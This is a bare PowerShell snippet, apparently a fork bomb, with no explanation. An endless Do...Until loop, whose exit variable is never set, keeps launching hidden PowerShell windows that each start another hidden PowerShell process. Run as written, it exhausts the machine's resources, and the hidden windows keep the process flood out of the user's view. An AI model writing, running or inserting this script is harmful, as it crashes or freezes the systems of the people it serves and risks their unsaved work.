Do {
    start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
}
}
Until ($x -eq $true)